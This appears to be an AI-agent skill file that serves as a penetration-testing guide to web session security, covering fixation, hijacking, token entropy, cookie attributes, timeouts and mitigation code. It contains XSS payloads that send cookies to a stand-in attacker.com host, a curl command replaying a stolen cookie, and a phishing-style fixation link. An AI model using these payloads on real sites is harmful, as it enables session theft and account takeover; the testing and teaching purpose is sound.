# Session Security Testing

---
name: Session Security Testing
description: This skill should be used when the user asks to "test for session vulnerabilities," "perform session hijacking attacks," "exploit session fixation flaws," "analyze session management security," or "test session cookie configurations." It provides comprehensive guidance for identifying and exploiting session management vulnerabilities in web applications.
version: 1.0.0
tags: [session-security, session-hijacking, session-fixation, web-security, penetration-testing]
---

## Purpose

Provide systematic methodologies for testing session management security in web applications. This skill covers session fixation, session hijacking, session ID analysis, cookie security assessment, and session timeout testing. It enables security professionals to identify weaknesses in how applications create, maintain, and terminate user sessions.

## Inputs / Prerequisites

- **Target Web Application**: URL of application with authentication functionality
- **Multiple User Accounts**: Test accounts for session manipulation testing
- **Proxy Tool**: Burp Suite or similar for session token interception
- **Network Analysis Tools**: Wireshark for network-level session capture
- **Browser Developer Tools**: For cookie and session analysis
- **Authorization**: Written permission for security testing activities

## Outputs / Deliverables

- **Session Security Assessment**: Comprehensive analysis of session management
- **Vulnerability Report**: Documentation of session-related weaknesses
- **Proof of Concept**: Working exploits demonstrating vulnerabilities
- **Cookie Configuration Analysis**: Assessment of cookie security attributes
- **Remediation Recommendations**: Specific fixes for identified issues

## Core Workflow

### 1. Understand Session Architecture

#### Session Components
```
Session ID: Unique identifier for user session
├── Generation: How the ID is created
├── Storage: Where it's stored (cookie, URL, header)
├── Transmission: How it's sent between client/server
├── Validation: How server verifies the session
└── Termination: How sessions are ended
```

#### Session Lifecycle
```
1. User visits application → Session created
2. User authenticates → Session associated with identity
3. User performs actions → Session maintains state
4. User logs out / timeout → Session invalidated
5. Session ID expires → Cannot be reused
```

### 2. Session Fixation Testing

#### Attack Mechanism
```
1. Attacker obtains valid session ID (pre-authentication)
2. Attacker sends session ID to victim (URL, cookie injection)
3. Victim logs in using attacker's session ID
4. Attacker uses same session ID to access victim's session
```

#### Test for Session Regeneration
```bash
# Step 1: Capture pre-authentication session ID
# Visit login page, capture session cookie
Session ID before login: abc123xyz

# Step 2: Log in and capture new session ID
# Check if session ID changes after authentication
Session ID after login: abc123xyz  # VULNERABLE - same ID

# Secure behavior:
Session ID after login: newxyz789  # Session ID regenerated
```

#### URL-Based Session Fixation Test
```
# Craft URL with fixed session ID
http://target.com/login?JSESSIONID=attacker_session_id

# Or PHP session
http://target.com/login?PHPSESSID=attacker_controlled_session

# Send to victim → If victim logs in with this ID, vulnerable
```

#### Cookie-Based Session Fixation Test
```javascript
// If attacker can set cookies on subdomain
document.cookie = "sessionid=attacker_session; domain=.target.com";

// Victim logs in → Attacker has valid authenticated session
```

### 3. Session Hijacking Testing

#### XSS-Based Session Theft
```html
<!-- If XSS vulnerability exists -->
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

<!-- Cookie will be sent to attacker's server -->
```

#### Network-Level Session Capture
```bash
# Using Wireshark to capture session tokens
# Filter for HTTP traffic
http contains "Cookie"
http contains "Set-Cookie"
http contains "sessionid"

# Capture on unsecured HTTP connections
# Session tokens visible in plaintext
```

#### Session Token Prediction
```python
# Analyze session ID patterns
# Weak: Sequential or timestamp-based
session1 = "session_1234567890"
session2 = "session_1234567891"  # Predictable increment

# Strong: Random, high-entropy
session1 = "a3f8b2c9d4e5f6a7b8c9d0e1f2a3b4c5"
session2 = "x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2"  # Unpredictable
```

### 4. Session ID Analysis

#### Entropy Assessment
```python
# Analyze session ID randomness
import collections
import math

def calculate_entropy(session_id):
    # Count character frequencies
    freq = collections.Counter(session_id)
    length = len(session_id)
    
    # Calculate Shannon entropy
    entropy = -sum((count/length) * math.log2(count/length) 
                   for count in freq.values())
    return entropy

# Low entropy = weak session ID
# High entropy = strong session ID
```

#### Pattern Detection
```
Collect multiple session IDs and analyze:
1. Length consistency
2. Character set used
3. Sequential patterns
4. Timestamp components
5. Predictable prefixes/suffixes
```

### 5. Cookie Security Analysis

#### Check Cookie Attributes
```http
Set-Cookie: sessionid=abc123; 
            Secure;         # Only sent over HTTPS
            HttpOnly;       # Not accessible via JavaScript
            SameSite=Strict; # Prevents CSRF
            Path=/;         # Scope of cookie
            Max-Age=3600    # Expiration time
```

#### Missing Security Attributes Test
```
| Attribute | Missing Impact |
|-----------|---------------|
| Secure | Session sent over HTTP (sniffable) |
| HttpOnly | XSS can steal session |
| SameSite | CSRF attacks possible |
| Path | Overly broad cookie scope |
```

#### Cookie Scope Issues
```
# Overly permissive domain
Set-Cookie: session=abc; domain=.company.com
# Accessible to all subdomains - risk if any subdomain compromised

# Secure: Specific path
Set-Cookie: session=abc; path=/app; domain=app.company.com
```

### 6. Session Timeout Testing

#### Idle Timeout Test
```
1. Login to application
2. Note session ID
3. Wait for specified timeout period (e.g., 30 minutes)
4. Attempt to use session
5. Check if session is invalidated

# Vulnerable if session remains valid indefinitely
```

#### Absolute Timeout Test
```
1. Login and actively use application
2. Keep session active for extended period
3. Check if session expires after maximum lifetime
4. Long-lived sessions increase exposure window
```

#### Post-Logout Session Test
```
1. Login and capture session ID
2. Logout from application
3. Attempt to use captured session ID
4. Session should be invalidated server-side

# Vulnerable if session remains valid after logout
```

## Quick Reference

### Session Attack Comparison

| Attack | Mechanism | Attacker Action | Prevention |
|--------|-----------|-----------------|------------|
| Session Fixation | Set victim's session ID | Active - sends crafted link | Regenerate ID on login |
| Session Hijacking | Steal existing session | Passive - captures ID | Secure transmission |
| Session Replay | Reuse captured session | Replay valid token | Token expiration |
| Session Prediction | Guess valid session | Calculate/brute force | Strong randomness |

### Cookie Attribute Checklist

| Attribute | Value | Security Impact |
|-----------|-------|-----------------|
| Secure | Present | Prevents HTTP transmission |
| HttpOnly | Present | Prevents JavaScript access |
| SameSite | Strict/Lax | Prevents CSRF attacks |
| Path | Restrictive | Limits cookie scope |
| Domain | Specific | Prevents subdomain access |
| Expires/Max-Age | Short | Limits exposure window |

### Session ID Quality Indicators

| Characteristic | Weak | Strong |
|----------------|------|--------|
| Length | < 64 bits | ≥ 128 bits |
| Randomness | Low entropy | High entropy (CSPRNG) |
| Pattern | Predictable | No discernible pattern |
| Uniqueness | Reused/sequential | Unique per session |
| Encoding | Plain values | Cryptographically secure |

### Session Testing Checklist

| Test | Method | Expected Secure Behavior |
|------|--------|-------------------------|
| Regeneration on login | Compare pre/post IDs | New session ID generated |
| Logout invalidation | Use old session | Request rejected |
| Timeout expiration | Wait + retry | Session expired |
| Secure transmission | Check for HTTPS | All session traffic encrypted |
| Cookie flags | Inspect Set-Cookie | HttpOnly, Secure, SameSite |
| Concurrent sessions | Login from two locations | Policy enforced |

## Constraints and Limitations

### Operational Boundaries
- Network-level attacks require positioned access
- XSS-based hijacking requires XSS vulnerability
- Session fixation depends on application behavior
- Some frameworks have built-in protections
- Modern browsers implement SameSite defaults

### Testing Challenges
- Encrypted sessions harder to analyze
- Token-based authentication (JWT) operates differently
- Load balancers may affect session behavior
- Session clustering complicates testing

### Legal Requirements
- Only test applications with written authorization
- Do not hijack real user sessions
- Document all testing activities
- Report findings through proper channels

## Examples

### Example 1: Session Fixation via URL
```
# Step 1: Attacker obtains session ID
Attacker visits: http://target.com/
Receives: Set-Cookie: PHPSESSID=attacker123

# Step 2: Attacker crafts malicious URL
http://target.com/login.php?PHPSESSID=attacker123

# Step 3: Send to victim
Subject: Reset your password
Link: http://target.com/login.php?PHPSESSID=attacker123

# Step 4: Victim clicks and logs in
Victim authenticates using PHPSESSID=attacker123

# Step 5: Attacker accesses victim's session
Attacker sends: Cookie: PHPSESSID=attacker123
Result: Access to victim's authenticated session
```

### Example 2: XSS Session Hijacking
```html
<!-- Stored XSS vulnerability exploited -->
<script>
// Create image to exfiltrate cookie
new Image().src = "https://attacker.com/steal.php?" + 
                  "cookie=" + encodeURIComponent(document.cookie) +
                  "&url=" + encodeURIComponent(location.href);
</script>

<!-- Attacker's server logs: -->
<!-- GET /steal.php?cookie=sessionid%3Dabc123&url=... -->

<!-- Attacker uses stolen session -->
curl -H "Cookie: sessionid=abc123" https://target.com/account
```

### Example 3: Session Not Regenerated on Login
```
# Pre-authentication request
GET /login HTTP/1.1
Host: target.com

# Response sets session
HTTP/1.1 200 OK
Set-Cookie: session=xyz789; Path=/

# User logs in
POST /login HTTP/1.1
Cookie: session=xyz789
username=user&password=pass

# Response - VULNERABLE
HTTP/1.1 302 Found
# No new Set-Cookie header - same session ID used!

# Secure behavior would include:
Set-Cookie: session=newsession456; Path=/  # New session
```

### Example 4: Post-Logout Session Still Valid
```
# User logged in
GET /dashboard HTTP/1.1
Cookie: session=abc123
# Response: 200 OK - Dashboard content

# User logs out
POST /logout HTTP/1.1
Cookie: session=abc123
# Response: 302 Redirect to login

# Test: Attacker uses old session
GET /dashboard HTTP/1.1
Cookie: session=abc123

# VULNERABLE Response: 200 OK - Dashboard still accessible!
# Session not invalidated server-side

# Secure Response: 401/403 - Session invalid
```

### Example 5: Missing Cookie Security Attributes
```http
# Insecure cookie configuration
Set-Cookie: sessionid=abc123

# Missing attributes make session vulnerable:
# - No Secure: Sent over HTTP (sniffable)
# - No HttpOnly: Accessible via JavaScript (XSS)
# - No SameSite: Included in cross-site requests (CSRF)

# Secure configuration
Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

### Example 6: Concurrent Session Testing
```
# Login from Device A
POST /login HTTP/1.1
username=victim&password=pass123
# Response: Session A created

# Login from Device B (attacker has credentials)
POST /login HTTP/1.1
username=victim&password=pass123
# Response: Session B created

# Test: Is Session A still valid?
GET /account HTTP/1.1
Cookie: session=sessionA

# Vulnerable: Both sessions active simultaneously
# Secure: Session A invalidated when Session B created
# Or: User notified of concurrent login
```

## Troubleshooting

### Issue: Cannot Identify Session Token
**Cause**: Token may be stored in non-obvious location
**Solution**:
```
Check multiple storage locations:
1. Cookies: document.cookie, browser dev tools
2. URL parameters: Check for ?session=, ?sid=, ?token=
3. HTTP headers: Authorization, X-Session-Token
4. Local/Session Storage: localStorage, sessionStorage
5. Response body: JSON responses, hidden form fields
```

### Issue: Session Token Changes Every Request
**Cause**: Application uses rotating session tokens
**Solution**:
```
# This is often a security feature
1. Capture the token rotation pattern
2. Look for persistent identifier alongside rotating token
3. Check if old tokens remain valid briefly
4. Test if rotation breaks session fixation
5. Document as defense-in-depth measure
```

### Issue: Cannot Test Session Fixation
**Cause**: Framework prevents URL-based session IDs
**Solution**:
```
# Alternative fixation vectors:
1. Subdomain cookie injection (if attacker controls subdomain)
2. XSS-based cookie setting
3. Man-in-the-middle cookie injection
4. Check for meta tag or JavaScript-based session setting
```

### Issue: Session Timeout Not Working
**Cause**: Client-side vs server-side timeout mismatch
**Solution**:
```
# Verify server-side timeout:
1. Capture session token
2. Wait past expected timeout
3. Make request directly (bypass client)
4. Server should reject if properly implemented

# Client-side timeout only = vulnerable
```

### Issue: Secure Flag Present But Token Still Captured
**Cause**: Initial session set over HTTP before HTTPS redirect
**Solution**:
```
# Test for secure flag on initial page load:
1. Access http://target.com (not https)
2. Check if session cookie set over HTTP
3. Redirect to HTTPS may reuse HTTP cookie
4. HSTS can help prevent this
```

## Mitigation Guidance

### Session ID Regeneration
```python
# Regenerate session on authentication
def login(request):
    if authenticate(request.user, request.password):
        # Invalidate old session
        request.session.invalidate()
        # Create new session
        request.session.regenerate()
        # Associate with user
        request.session['user_id'] = user.id
```

### Secure Cookie Configuration
```python
# Django settings
SESSION_COOKIE_SECURE = True      # Only HTTPS
SESSION_COOKIE_HTTPONLY = True    # No JavaScript access
SESSION_COOKIE_SAMESITE = 'Strict' # No cross-site
SESSION_COOKIE_AGE = 3600         # 1 hour timeout
```

### Server-Side Session Validation
```python
def validate_session(session_id):
    session = Session.objects.get(id=session_id)
    
    # Check expiration
    if session.expired:
        return False
    
    # Check IP binding (optional)
    if session.ip != request.ip:
        return False
    
    # Check user agent (optional)
    if session.user_agent != request.user_agent:
        return False
    
    return True
```

### Proper Logout Implementation
```python
def logout(request):
    session_id = request.session.id
    
    # Clear session data
    request.session.clear()
    
    # Invalidate session server-side
    Session.objects.filter(id=session_id).delete()
    
    # Clear client cookie
    response = redirect('/login')
    response.delete_cookie('sessionid')
    
    return response
```
